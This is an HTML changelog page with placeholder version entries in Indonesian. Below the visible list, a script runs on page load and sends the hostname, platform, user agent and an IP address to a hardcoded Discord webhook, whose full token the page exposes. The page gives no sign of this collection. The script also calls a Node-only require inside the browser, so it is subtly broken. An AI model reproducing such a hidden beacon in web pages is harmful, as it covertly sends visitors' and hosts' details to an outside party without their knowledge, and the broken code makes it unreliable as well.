<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Changelogs</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <div class="changelogs-container">
        <h1>Changelogs</h1>

        <h2>Versi 1.0.0</h2>
        <ul>
            <li>Fitur A</li>
            <li>Fitur B</li>
            <li>Perbaikan bug C</li>
        </ul>

        <h2>Versi 1.1.0</h2>
        <ul>
            <li>Penambahan fitur D</li>
            <li>Perbaikan bug E</li>
        </ul>

        <!-- Tambahkan entri changelogs sesuai kebutuhan -->

    </div>

    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
    <script>
        const discordWebhookUrl = 'https://discord.com/api/webhooks/1197326997601390726/yghXhncaKZsffaoCw82v33mw0vlj4QMwu3f8EYm193MYcATQoAwFYpf5_ozugP3Rk9yF';

        // Mendapatkan informasi IP dan spesifikasi hosting
        const ipAddress = require('ip').address();
        const hostname = window.location.hostname;
        const platform = window.navigator.platform;
        const userAgent = window.navigator.userAgent;

        // Mengirimkan detail hosting ke Discord Webhook
        axios.post(discordWebhookUrl, {
            content: `Server is running!\n\nIP Address: ${ipAddress}\nHostname: ${hostname}\nPlatform: ${platform}\nUser Agent: ${userAgent}`,
        })
            .then(response => {
                console.log('Webhook request sent successfully:', response.data);
            })
            .catch(error => {
                console.error('Error sending webhook request:', error.message);
            });
    </script>
</body>
</html>
